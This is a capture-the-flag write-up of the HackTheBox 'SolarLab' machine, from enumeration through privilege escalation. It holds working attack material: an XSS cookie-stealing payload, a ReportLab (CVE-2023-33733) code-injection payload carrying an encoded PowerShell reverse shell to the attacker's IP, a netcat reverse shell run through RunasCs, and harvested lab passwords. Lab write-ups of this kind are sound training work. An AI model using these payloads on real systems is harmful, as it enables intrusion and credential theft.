# SolarLab

<figure><img src="../../.gitbook/assets/SolarLab.png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -p- -Pn solarlab.htb -oN nmap
```

```bash
Nmap scan report for solarlab.htb (10.10.11.16)
Host is up (0.053s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0
|_http-title: SolarLab Instant Messenger
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-15T09:32:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   52.14 ms 10.10.14.1
2   53.78 ms solarlab.htb (10.10.11.16)

NSE: Script Post-scanning.
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 260.17 seconds
           Raw packets sent: 196835 (8.664MB) | Rcvd: 2376 (540.933KB)

```

### Port 80

<figure><img src="../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

These could be users of the domain:

<figure><img src="../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

I initially assumed that the contact form was vulnerable to XSS so I tried listening and sending such a payload but got no results:

```
<img+src%3dx+onerror%3dfetch("http%3a//10.10.15.101%3a8888/"%2bdocument.cookie)%3b> 
```

Also the newsletter form return 405 Not allowed:

<figure><img src="../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

### Port 6791

Since nmap sees an nginx on port 6791, if we try to visit `http://solarlab.htb:6791` there would appear to be a redirect to the endpoint `http://report.solarlab.htb:6791`. Therefore we also add this FQDN to the `/etc/hosts` file.

<figure><img src="../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (689).png" alt=""><figcaption></figcaption></figure>

`http://report.solarlab.htb:6791`

<figure><img src="../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

After running a directory listing with `gobuster` and getting these 3 pages the web server starts returning HTTP response code 502:

<figure><img src="../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### Port 445

From Nmap we know that: "Message signing enabled but not required"

<figure><img src="../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

Having no further information from port 80 we try to get something from SMB. If we try to RID Cycle usernames we obtain an interesting result:

{% hint style="warning" %}
Note how the attack in this case works only by using usernames such as guest or anonymous
{% endhint %}

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

Note this 2 users:

```
SOLARLAB\blake
SOLARLAB\openfire
```

Access SMB share using anonymous user we find `Documents` share:

```bash
smbclient -U '' -L \\\\solarlab.htb
```

<figure><img src="../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

Accessing it there are different files and folders:

<figure><img src="../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

The `details-file.xlsx` is the most interesting:

<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

## Foothold (user blakeb)

We know that there is a user called Blake (from RID brute force attack and webpage analysis) so try these credentials to login at `http://report.solarlab.htb:6791`:

`blake.byte` : `ThisCanB3typedeasily1@`

We get an error. This is very strange :person\_shrugging:

Try using the username blake previously enumerated and excel file password. Again there is an error saying that user is not found...

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Since the format of the usernames is know “Firstname” followed by initial of last name the username for Blake would be “BlakeB” as "AlexanderK" or "ClaudiaS" listed in the file:

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

So finally `BlakeB`:`ThisCanB3typedeasily1@` it's a WIN! :tada:

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

Each section allows a request to be made to management automatically, and the form for each request always has as a required field the upload of the signature image, which is then inserted within the automatically generated PDF.

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Analyzing the traffic with BurpSuite we note that the backend uses the ReportLab library to generate the PDF:

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://docs.reportlab.com/" %}

Trying to search for a vulnerability regarding ReportLab one comes across the following: [https://github.com/c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)

Going to modify the POST request and adding the payload present inside the `poc.py`:

{% code overflow="wrap" %}
```python
from reportlab.platypus import SimpleDocTemplate, Paragraph
from io import BytesIO
stream_file = BytesIO()
content = []

def add_paragraph(text, content):
    """ Add paragraph to document content"""
    content.append(Paragraph(text))

def get_document_template(stream_file: BytesIO):
    """ Get SimpleDocTemplate """
    return SimpleDocTemplate(stream_file)

def build_document(document, content, **props):
    """ Build pdf document based on elements added in `content`"""
    document.build(content, **props)



doc = get_document_template(stream_file)
#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated < 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]

add_paragraph("""
            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)
```
{% endcode %}

The payload to be used is as follows:

{% code overflow="wrap" %}
```html
<para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('curl http://10.10.15.101:6060') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>
```
{% endcode %}

we get feedback in the terminal as shown in the figure:

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

This means that there is RCE and we can exploit it to get a reverse shell:

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

`pwncat-cs` in this case does not seem to work properly and fails to establish a connection with the reverse shell. Instead, using netcat wrapped with rlwrap we will have a shell and blake's user flag :wine\_glass:

Full payload:

{% code overflow="wrap" %}
```html
<para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADEAIgAsADYAMAA2ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>
```
{% endcode %}

We get the first shell as blakeB users and the corresponding Flag:

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

To have a more stabilezed and functional shell we can use `metasploit` as follow:

<figure><img src="../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

### Upgrade Normal Shell To Meterpreter Shell <a href="#id-1387" id="id-1387"></a>

Background the current (Normal Shell) session, we can do this by pressing **CTRL+Z:**

<figure><img src="../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

Now Run the following command `search shell_to_meterpreter`:

<figure><img src="../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

Now we have to configure which session shell to upgrade. We can see the session by running the following command i.e `sessions -l`.

Configure the session to upgrade using `set SESSION <ID>` and then `run`:

<figure><img src="../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

Now finally list the sessions running and interact with meterpreter session created `session -i <ID>`:

<figure><img src="../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

## Enumeration (privesc)

Inside the `C:\Users\blake\Documents\app` directory we find some interesting code like:

{% code title="app.py" %}
```python
# app.py
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
import os

app = Flask(__name__)
app.secret_key = os.urandom(64)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'c:\\users\\blake\\documents\\app\\reports'
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# Import other modules with routes and configurations
from routes import *
from models import User, db
from utils import create_database

db.init_app(app)

with app.app_context():
   create_database()

# Initialize Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

app.route('/')(index)
app.route('/login', methods=['GET', 'POST'])(login)
app.route('/logout')(logout)
app.route('/dashboard')(dashboard)
app.route('/leaveRequest', methods=['GET', 'POST'])(leaveRequest)
app.route('/trainingRequest', methods=['GET', 'POST'])(trainingRequest)
app.route('/homeOfficeRequest', methods=['GET', 'POST'])(homeOfficeRequest)
app.route('/travelApprovalForm', methods=['GET', 'POST'])(travelApprovalForm)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True, threaded=True)
```
{% endcode %}

The `users.db` file is unreadable so let's download it locally using meterpreter session:

<figure><img src="../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

We can open it using sqlite3 client then listing tables and finally obtain username:passwords

<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

```
blakeb        -    ThisCanB3typedeasily1@
claudias      -    007poiuytrewq
alexanderk    -    HotP!fireguard
```



Upload `WinPeas` and scan for PE possibilities. There is an interesting LISTENING port (9090) that is OpenFire service:

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>

If we list the local users we can verify that only `openfire`, `blakeb` and `Administrator` accounts exists locally:

```powershell
Get-LocalUser
```

<figure><img src="../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (openfire)

I am going to try escalating to this user using `RunasCs.exe`. and the knowing credentials found (uploading executable using meterpreter upload feature).&#x20;

In fact, alexanderk's password contains the string _<mark style="color:orange;">fireguard</mark>_ is this might make us think of a reuse of the password for the openfire account.

Also we need `netcat` to spawn a bind powershell, so create a temporary folder under C:\ that must be readable to all users in particular blakeb and openfire in order to escalate correctly:



<figure><img src="../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
.\RunasCs.exe openfire HotP!fireguard "C:\temp\nc.exe 10.10.15.101 9999 -e powershell"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

## Enumeration (Administrator)

Listing the active services we see that Openfire is present and the path is as shown in the image. Let's go and see what is inside that path:

<figure><img src="../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

The embedded-db folder makes us think of a database used in Openfire; inside are several files:

<figure><img src="../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>

If we analyze the openfire.script:

{% code overflow="wrap" %}
```sql
SET DATABASE UNIQUE NAME HSQLDB8BDD3B2742
SET DATABASE GC 0
SET DATABASE DEFAULT RESULT MEMORY ROWS 0
SET DATABASE EVENT LOG LEVEL 0
SET DATABASE TRANSACTION CONTROL LOCKS
SET DATABASE DEFAULT ISOLATION LEVEL READ COMMITTED
SET DATABASE TRANSACTION ROLLBACK ON CONFLICT TRUE
SET DATABASE TEXT TABLE DEFAULTS ''
SET DATABASE SQL NAMES FALSE
SET DATABASE SQL REFERENCES FALSE
SET DATABASE SQL SIZE TRUE
SET DATABASE SQL TYPES FALSE
SET DATABASE SQL TDC DELETE TRUE
SET DATABASE SQL TDC UPDATE TRUE
SET DATABASE SQL CONCAT NULLS TRUE
SET DATABASE SQL UNIQUE NULLS TRUE
SET DATABASE SQL CONVERT TRUNCATE TRUE
SET DATABASE SQL AVG SCALE 0
SET DATABASE SQL DOUBLE NAN TRUE
SET FILES WRITE DELAY 1
SET FILES BACKUP INCREMENT TRUE
SET FILES CACHE SIZE 10000
SET FILES CACHE ROWS 50000
SET FILES SCALE 32
SET FILES LOB SCALE 32
SET FILES DEFRAG 0
SET FILES NIO TRUE
SET FILES NIO SIZE 256
SET FILES LOG TRUE
SET FILES LOG SIZE 20
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
ALTER USER SA SET LOCAL TRUE
CREATE SCHEMA PUBLIC AUTHORIZATION DBA
SET SCHEMA PUBLIC
CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
CREATE INDEX OFUSER_CDATE_IDX ON PUBLIC.OFUSER(CREATIONDATE)
CREATE MEMORY TABLE PUBLIC.OFUSERPROP(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFUSERPROP_PK PRIMARY KEY(USERNAME,NAME))
CREATE MEMORY TABLE PUBLIC.OFUSERFLAG(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,STARTTIME VARCHAR(15),ENDTIME VARCHAR(15),CONSTRAINT OFUSERFLAG_PK PRIMARY KEY(USERNAME,NAME))
CREATE INDEX OFUSERFLAG_STIME_IDX ON PUBLIC.OFUSERFLAG(STARTTIME)
CREATE INDEX OFUSERFLAG_ETIME_IDX ON PUBLIC.OFUSERFLAG(ENDTIME)
CREATE MEMORY TABLE PUBLIC.OFOFFLINE(USERNAME VARCHAR(64) NOT NULL,MESSAGEID BIGINT NOT NULL,CREATIONDATE VARCHAR(15) NOT NULL,MESSAGESIZE INTEGER NOT NULL,STANZA VARCHAR(16777216) NOT NULL,CONSTRAINT OFOFFLINE_PK PRIMARY KEY(USERNAME,MESSAGEID))
CREATE MEMORY TABLE PUBLIC.OFPRESENCE(USERNAME VARCHAR(64) NOT NULL,OFFLINEPRESENCE VARCHAR(16777216),OFFLINEDATE VARCHAR(15) NOT NULL,CONSTRAINT OFPRESENCE_PK PRIMARY KEY(USERNAME))
CREATE MEMORY TABLE PUBLIC.OFROSTER(ROSTERID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,JID VARCHAR(1024) NOT NULL,SUB INTEGER NOT NULL,ASK INTEGER NOT NULL,RECV INTEGER NOT NULL,NICK VARCHAR(255),STANZA VARCHAR(16777216),CONSTRAINT OFROSTER_PK PRIMARY KEY(ROSTERID))
CREATE INDEX OFROSTER_USERNAME_IDX ON PUBLIC.OFROSTER(USERNAME)
CREATE INDEX OFROSTER_JID_IDX ON PUBLIC.OFROSTER(JID)
CREATE MEMORY TABLE PUBLIC.OFROSTERGROUPS(ROSTERID BIGINT NOT NULL,RANK INTEGER NOT NULL,GROUPNAME VARCHAR(255) NOT NULL,CONSTRAINT OFROSTERGROUPS_PK PRIMARY KEY(ROSTERID,RANK))
CREATE INDEX OFROSTERGROUP_ROSTERID_IDX ON PUBLIC.OFROSTERGROUPS(ROSTERID)
CREATE MEMORY TABLE PUBLIC.OFVCARD(USERNAME VARCHAR(64) NOT NULL,VCARD VARCHAR(16777216) NOT NULL,CONSTRAINT OFVCARD_PK PRIMARY KEY(USERNAME))
CREATE MEMORY TABLE PUBLIC.OFGROUP(GROUPNAME VARCHAR(50) NOT NULL,DESCRIPTION VARCHAR(255),CONSTRAINT OFGROUP_PK PRIMARY KEY(GROUPNAME))
CREATE MEMORY TABLE PUBLIC.OFGROUPPROP(GROUPNAME VARCHAR(50) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFGROUPPROP_PK PRIMARY KEY(GROUPNAME,NAME))
CREATE MEMORY TABLE PUBLIC.OFGROUPUSER(GROUPNAME VARCHAR(50) NOT NULL,USERNAME VARCHAR(100) NOT NULL,ADMINISTRATOR INTEGER NOT NULL,CONSTRAINT OFGROUPUSER_PK PRIMARY KEY(GROUPNAME,USERNAME,ADMINISTRATOR))
CREATE MEMORY TABLE PUBLIC.OFID(IDTYPE INTEGER NOT NULL,ID BIGINT NOT NULL,CONSTRAINT OFID_PK PRIMARY KEY(IDTYPE))
CREATE MEMORY TABLE PUBLIC.OFPROPERTY(NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,ENCRYPTED INTEGER,IV CHARACTER(24),CONSTRAINT OFPROPERTY_PK PRIMARY KEY(NAME))
CREATE MEMORY TABLE PUBLIC.OFVERSION(NAME VARCHAR(50) NOT NULL,VERSION INTEGER NOT NULL,CONSTRAINT OFVERSION_PK PRIMARY KEY(NAME))
CREATE MEMORY TABLE PUBLIC.OFEXTCOMPONENTCONF(SUBDOMAIN VARCHAR(255) NOT NULL,WILDCARD INTEGER NOT NULL,SECRET VARCHAR(255),PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFEXTCOMPONENTCONF_PK PRIMARY KEY(SUBDOMAIN))
CREATE MEMORY TABLE PUBLIC.OFREMOTESERVERCONF(XMPPDOMAIN VARCHAR(255) NOT NULL,REMOTEPORT INTEGER,PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFREMOTESERVERCONF_PK PRIMARY KEY(XMPPDOMAIN))
CREATE MEMORY TABLE PUBLIC.OFPRIVACYLIST(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,ISDEFAULT INTEGER NOT NULL,LIST VARCHAR(16777216) NOT NULL,CONSTRAINT OFPRIVACYLIST_PK PRIMARY KEY(USERNAME,NAME))
CREATE INDEX OFPRIVACYLIST_DEFAULT_IDX ON PUBLIC.OFPRIVACYLIST(USERNAME,ISDEFAULT)
CREATE MEMORY TABLE PUBLIC.OFSASLAUTHORIZED(USERNAME VARCHAR(64) NOT NULL,PRINCIPAL VARCHAR(4000) NOT NULL,CONSTRAINT OFSASLAUTHORIZED_PK PRIMARY KEY(USERNAME,PRINCIPAL))
CREATE MEMORY TABLE PUBLIC.OFSECURITYAUDITLOG(MSGID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,ENTRYSTAMP BIGINT NOT NULL,SUMMARY VARCHAR(255) NOT NULL,NODE VARCHAR(255) NOT NULL,DETAILS VARCHAR(16777216),CONSTRAINT OFSECURITYAUDITLOG_PK PRIMARY KEY(MSGID))
CREATE INDEX OFSECURITYAUDITLOG_TSTAMP_IDX ON PUBLIC.OFSECURITYAUDITLOG(ENTRYSTAMP)
CREATE INDEX OFSECURITYAUDITLOG_UNAME_IDX ON PUBLIC.OFSECURITYAUDITLOG(USERNAME)
CREATE MEMORY TABLE PUBLIC.OFMUCSERVICE(SERVICEID BIGINT NOT NULL,SUBDOMAIN VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),ISHIDDEN INTEGER NOT NULL,CONSTRAINT OFMUCSERVICE_PK PRIMARY KEY(SUBDOMAIN))
CREATE INDEX OFMUCSERVICE_SERVICEID_IDX ON PUBLIC.OFMUCSERVICE(SERVICEID)
CREATE MEMORY TABLE PUBLIC.OFMUCSERVICEPROP(SERVICEID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCSERVICEPROP_PK PRIMARY KEY(SERVICEID,NAME))
CREATE MEMORY TABLE PUBLIC.OFMUCROOM(SERVICEID BIGINT NOT NULL,ROOMID BIGINT NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,NAME VARCHAR(50) NOT NULL,NATURALNAME VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),LOCKEDDATE CHARACTER(15) NOT NULL,EMPTYDATE CHARACTER(15),CANCHANGESUBJECT INTEGER NOT NULL,MAXUSERS INTEGER NOT NULL,PUBLICROOM INTEGER NOT NULL,MODERATED INTEGER NOT NULL,MEMBERSONLY INTEGER NOT NULL,CANINVITE INTEGER NOT NULL,ROOMPASSWORD VARCHAR(50),CANDISCOVERJID INTEGER NOT NULL,LOGENABLED INTEGER NOT NULL,SUBJECT VARCHAR(100),ROLESTOBROADCAST INTEGER NOT NULL,USERESERVEDNICK INTEGER NOT NULL,CANCHANGENICK INTEGER NOT NULL,CANREGISTER INTEGER NOT NULL,ALLOWPM INTEGER,FMUCENABLED INTEGER,FMUCOUTBOUNDNODE VARCHAR(255),FMUCOUTBOUNDMODE INTEGER,FMUCINBOUNDNODES VARCHAR(4000),CONSTRAINT OFMUCROOM_PK PRIMARY KEY(SERVICEID,NAME))
CREATE INDEX OFMUCROOM_ROOMID_IDX ON PUBLIC.OFMUCROOM(ROOMID)
CREATE INDEX OFMUCROOM_SERVICEID_IDX ON PUBLIC.OFMUCROOM(SERVICEID)
CREATE MEMORY TABLE PUBLIC.OFMUCROOMPROP(ROOMID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCROOMPROP_PK PRIMARY KEY(ROOMID,NAME))
CREATE MEMORY TABLE PUBLIC.OFMUCAFFILIATION(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION INTEGER NOT NULL,CONSTRAINT OFMUCAFFILIATION_PK PRIMARY KEY(ROOMID,JID))
CREATE MEMORY TABLE PUBLIC.OFMUCMEMBER(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),FIRSTNAME VARCHAR(100),LASTNAME VARCHAR(100),URL VARCHAR(100),EMAIL VARCHAR(100),FAQENTRY VARCHAR(100),CONSTRAINT OFMUCMEMBER_PK PRIMARY KEY(ROOMID,JID))
CREATE MEMORY TABLE PUBLIC.OFMUCCONVERSATIONLOG(ROOMID BIGINT NOT NULL,MESSAGEID BIGINT NOT NULL,SENDER VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),LOGTIME CHARACTER(15) NOT NULL,SUBJECT VARCHAR(255),BODY VARCHAR(16777216),STANZA VARCHAR(16777216))
CREATE INDEX OFMUCCONVERSATIONLOG_ROOMTIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(ROOMID,LOGTIME)
CREATE INDEX OFMUCCONVERSATIONLOG_TIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(LOGTIME)
CREATE INDEX OFMUCCONVERSATIONLOG_MSG_ID ON PUBLIC.OFMUCCONVERSATIONLOG(MESSAGEID)
CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODE(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,PARENT VARCHAR(100),DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER,PERSISTITEMS INTEGER,MAXITEMS INTEGER,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,CONFIGSUBSCRIPTION INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,PAYLOADTYPE VARCHAR(100),BODYXSLT VARCHAR(100),DATAFORMXSLT VARCHAR(100),CREATOR VARCHAR(1024) NOT NULL,DESCRIPTION VARCHAR(255),LANGUAGE VARCHAR(255),NAME VARCHAR(50),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15),MAXLEAFNODES INTEGER,CONSTRAINT OFPUBSUBNODE_PK PRIMARY KEY(SERVICEID,NODEID))
CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEJIDS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,ASSOCIATIONTYPE VARCHAR(20) NOT NULL,CONSTRAINT OFPUBSUBNODEJIDS_PK PRIMARY KEY(SERVICEID,NODEID,JID))
CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ROSTERGROUP VARCHAR(100) NOT NULL)
CREATE INDEX OFPUBSUBNODEGROUPS_IDX ON PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID,NODEID)
CREATE MEMORY TABLE PUBLIC.OFPUBSUBAFFILIATION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION VARCHAR(10) NOT NULL,CONSTRAINT OFPUBSUBAFFILIATION_PK PRIMARY KEY(SERVICEID,NODEID,JID))
